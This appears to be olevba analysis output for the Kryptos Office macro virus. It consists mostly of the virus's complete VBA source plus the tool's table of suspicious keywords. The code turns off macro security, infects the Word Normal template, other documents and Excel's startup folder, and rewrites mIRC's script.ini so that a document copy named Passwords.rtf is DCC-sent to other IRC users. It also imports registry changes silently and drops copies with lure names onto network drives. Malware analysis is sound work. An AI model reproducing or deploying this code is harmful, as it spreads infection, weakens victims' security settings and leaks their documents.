olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Kryptos
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSOffice.Kryptos - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
On Error Resume Next
'Kryptos
Options.SaveNormalPrompt = 0
Options.SendMailAttach = 1
Options.ConfirmConversions = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1
Else
CommandBars("Tools").Controls("Macro").Enabled = 0
Options.VirusProtection = 0
End If
Set glob = NormalTemplate.VBProject.VBComponents(1).codemodule
Set curr = ActiveDocument.VBProject.VBComponents(1).codemodule
If glob.Lines(3, 1) <> "'Kryptos" Then
glob.DeleteLines 1, glob.CountOfLines
glob.InsertLines 2, curr.Lines(2, curr.CountOfLines)
glob.InsertLines 1, "Sub Document_Open()"
glob.replaceline 45, "Sub Workbook_Deactivate": glob.replaceline 101, "Sub FileExit()"
End If
If curr.Lines(3, 1) <> "'Kryptos" Then
curr.DeleteLines 1, curr.CountOfLines
curr.InsertLines 2, glob.Lines(2, glob.CountOfLines)
curr.InsertLines 1, "Sub Document_Close()"
curr.replaceline 45, "Sub Workbook_Activate()": curr.replaceline 101, "Sub Dodo()"
Kill "c:\mirc\script.ini": Open "c:\mirc\script.ini" For Output As 1: Print #1, "[script]": Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\Passwords.rtf }"
Print #1, "n1=on 1:CONNECT: {": Close 1
End If
Set xlApp = CreateObject("Excel.Application")
If UCase(Dir(xlApp.Application.StartupPath + "\Book1.")) <> UCase("BOOK1") Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0"
Set Book1Obj = xlApp.Workbooks.Add
Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.InsertLines 1, glob.Lines(1, glob.CountOfLines)
Book1Obj.VBProject.VBComponents.Item("ThisWorkbook").codemodule.replaceline 45, "Sub Workbook_Deactivate()"
Book1Obj.SaveAs xlApp.Application.StartupPath & "\Book1."
Book1Obj.Close
Mze$ = ActiveDocument.FullName: ActiveDocument.SaveAs FileName:="c:\passwords.rtf", LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ActiveDocument.SaveAs FileName:=Mze$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
End If
End Sub
   
Sub Workbook_Activate()
On Error Resume Next
Set aw = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
Set tw = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
tw.replaceline 45, "Sub Workbook_Deactivate": tw.replaceline 101, "Sub Disabled()"
If aw.Lines(3, 1) <> "'Kryptos" Then
aw.DeleteLines 1, aw.CountOfLines
aw.InsertLines 1, tw.Lines(1, tw.CountOfLines)
End If
If UCase(Dir(Application.StartupPath + "\Book1.")) <> "BOOK1" Then
ActiveWorkbook.SaveAs Excel.Application.StartupPath & "\Book1."
Open "c:\Kryptos.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]"
Print #1, """CodeForeColors""=""1 1 5 0 1 1 1 1 0 0 0 0 0 0 0 0 """
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\VBA\Office]"
Print #1, """CodeBackColors""=""1 1 0 7 6 0 0 0 0 0 0 0 0 0 0 0 """
Reset
Open "c:\index.html" For Output As 1
Print #1, "<html><head><title>Kryptos</title></head><body><center> "
Print #1, "Met a girl in the rain<br>"
Print #1, "waiting for a train<br>"
Print #1, "I said I missed my plane<br>"
Print #1, "She said I guess you'll have to stay with me<br>"
Print #1, "Do you live far away<br>"
Print #1, "Sometimes it's hard to say<br>"
Print #1, "She said look it's starting to snow<br>"
Print #1, "and god I want to go where the sun goes<br>"
Print #1, "where the sun goes<br>"
Print #1, "But she's so cold<br>"
Print #1, "she's so cold<br><p>"
Print #1, "<br>KrYpToS<i> - Welcome to a new age</i><br></html>"
Close 1
Shell "regedit /s c:\Kryptos.reg", vbHide
Set WordObj = GetObject(, "Word.Application")
If WordObj = "" Then
Set WordObj = CreateObject("Word.Application")
crossQuit = True
End If
End If
Set glob = WordObj.NormalTemplate.VBProject.VBComponents(1).codemodule
WordObj.Options.SaveNormalPrompt = False
glob.DeleteLines 1, glob.CountOfLines
glob.InsertLines 1, tw.Lines(1, tw.CountOfLines)
glob.replaceline 1, "Sub Document_Open"
glob.Save
If crossQuit = True Then
WordObj = ""
WordObj.Quit
End If
End Sub

Sub Dodo()
On Error Resume Next
Randomize
  fe = Int(Rnd * 7) + 1
  If fe = 1 Then fet$ = "YearlyReport.rtf"
  If fe = 3 Then fet$ = "Costcutting.rtf"
  If fe = 2 Then fet$ = "Readme.rtf"
  If fe = 4 Then fet$ = "Secret.rtf"
  If fe = 5 Then fet$ = "FinanceRep.rtf"
  If fe = 6 Then fet$ = "NetworkSecurity" & Now & ".rtf"
  If fe = 7 Then fet$ = "Passwords.rtf"
ChangeFileOpenDirectory "h:"
ActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ChangeFileOpenDirectory "m:"
ActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ChangeFileOpenDirectory "z:"
ActiveDocument.SaveAs FileName:=zet$, LockComments:=False, AddToRecentFiles:=False, ReadOnlyRecommended:=False
ChangeFileOpenDirectory "C:"
Application.Quit
End If

End Sub











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Kryptos.reg         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

